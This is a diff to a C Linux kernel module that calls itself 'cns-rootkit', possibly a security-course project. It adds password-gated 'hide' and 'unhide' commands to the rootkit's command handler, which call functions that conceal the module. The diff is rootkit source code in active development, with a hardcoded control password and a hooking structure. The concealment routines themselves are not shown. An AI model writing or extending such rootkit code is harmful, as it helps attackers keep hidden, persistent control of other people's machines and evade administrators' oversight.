@@ -21,6 +21,8 @@ MODULE_LICENSE("MIT");
 MODULE_AUTHOR("SAV");
 
 #define PASSWORD "HohoHaha"
+#define CMD_HIDE_ROOTKIT "hide"
+#define CMD_UNHIDE_ROOTKIT "unhide"
 #define CMD1 "cmd1"
 
 struct hook {
@@ -116,7 +118,15 @@ void command_execute(char __user *buf, size_t count) {
   if(strncmp(buf, CMD1, sizeof(CMD1) - 1) == 0) {
     printk(KERN_INFO "cns-rootkit: got command1\n");
     // call some function here
+    //cns_rootkit_unhide();
+  } else if(strncmp(buf, CMD_HIDE_ROOTKIT, sizeof(CMD_HIDE_ROOTKIT) - 1) == 0) {
+    printk(KERN_INFO "cns-rootkit: got command HIDE\n");
+    cns_rootkit_hide();
+    return;
+  } else if(strncmp(buf, CMD_UNHIDE_ROOTKIT, sizeof(CMD_UNHIDE_ROOTKIT) - 1) == 0) {
+    printk(KERN_INFO "cns-rootkit: got command UNHIDE\n");
     cns_rootkit_unhide();
+    return;
   } else {
     printk(KERN_INFO "cns-rootkit: got unknown command\n");
   }
